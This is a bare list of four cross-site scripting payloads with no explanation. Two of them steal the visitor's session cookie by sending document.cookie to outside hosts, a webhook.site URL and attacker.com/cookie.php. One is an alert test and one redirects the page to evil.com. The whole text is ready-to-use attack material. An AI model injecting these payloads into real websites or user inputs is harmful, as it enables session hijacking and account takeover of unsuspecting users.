```
[XSS](javascript:window.onerror=window.location='https://webhook.site/09731cdb-80b0-47e8-a057-f86e939f1ad9?'+document.cookie)
<script>new Image().src="https://attacker.com/cookie.php?cookie="+document.cookie</script>
<script>alert("XSS")</script>
<script>window.location.href="https://evil.com"</script>
```